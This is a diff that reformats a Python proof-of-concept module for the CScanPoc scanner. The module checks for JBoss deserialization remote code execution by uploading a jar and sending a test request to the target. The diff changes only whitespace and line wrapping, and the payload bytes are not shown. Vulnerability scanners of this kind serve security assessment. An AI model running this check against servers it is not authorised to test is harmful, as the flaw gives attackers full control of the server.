@@ -4,25 +4,27 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'JBoss_0006' # 平台漏洞编号
-    name = 'Jboss反序列化代码执行' # 漏洞名称
-    level = VulnLevel.HIGH # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    vuln_id = 'JBoss_0006'  # 平台漏洞编号
+    name = 'Jboss反序列化代码执行'  # 漏洞名称
+    level = VulnLevel.HIGH  # 漏洞危害级别
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2015-11-25'  # 漏洞公布时间
     desc = '''
         可直接执行任意代码，进而直接导致服务器被入侵控制。
-    ''' # 漏洞描述
-    ref = 'http://www.freebuf.com/articles/86950.html' # 
-    cnvd_id = 'Unknown' # cnvd漏洞编号
+    '''  # 漏洞描述
+    ref = 'http://www.freebuf.com/articles/86950.html'
+    cnvd_id = 'Unknown'  # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
     product = 'JBoss'  # 漏洞组件名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
-    poc_id = '6edbf06d-5f2b-4108-a0c7-31da05dc86b1' # 平台 POC 编号
+    poc_id = '6edbf06d-5f2b-4108-a0c7-31da05dc86b1'  # 平台 POC 编号
     author = '国光'  # POC编写者
-    create_date = '2018-06-01' # POC创建时间
+    create_date = '2018-06-01'  # POC创建时间
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
@@ -40,7 +42,8 @@ class Poc(ABPoc):
                 urllib2.urlopen(vul_url, upload_jar, timeout=timeout)
                 res = urllib2.urlopen(vul_url, vul_test, timeout=timeout)
                 if 'vultest11111' in res.read():
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                        target=self.target, name=self.vuln.name))
             except Exception, e:
                 self.output.info('执行异常{}'.format(e))
         except Exception, e:
@@ -48,6 +51,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
